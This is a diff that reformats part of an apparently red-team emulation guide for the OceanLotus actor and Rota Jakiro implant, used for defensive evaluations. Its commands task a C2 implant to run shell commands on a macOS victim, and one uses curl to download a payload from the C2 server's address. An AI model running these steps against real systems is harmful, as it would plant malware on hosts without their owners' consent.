@@ -430,29 +430,38 @@ Execute Rota Jakiro
    ```
 
    Veify the file downloaded
-   ```./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
+   ```
+   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
    ```
    
-   <details><summary>Trouble Shooting</summary>
-     
-      On the C2 server start a simple HTTP server
+   <details>
+      <summary>Trouble Shooting</summary>
+      
+On the C2 server start a simple HTTP server
 
-      ```
-      cd /opt/oceanlotus/Resources/payloads
-      python3 -m http.server
-      ```
-     
-      Task the implant
-      ```
-      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"curl 10.90.30.26:8000/rota -o /tmp/rota"}'
-      ```
-     
-     Veify the file downloaded
+```
+cd /opt/oceanlotus/Resources/payloads
+```
 
-      ```
-      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /tmp/rota"}'
-      ```
-     
+<br>
+
+```
+python3 -m http.server
+```
+
+Task the implant
+
+```
+./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"curl 10.90.30.26:8000/rota -o /tmp/rota"}'
+```
+
+Veify the file downloaded
+
+```
+./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /tmp/rota"}'
+```
+
+---
    </details>
 
 1. Task OceanLotus to SCP the Rota Jakiro implant to the Linux host
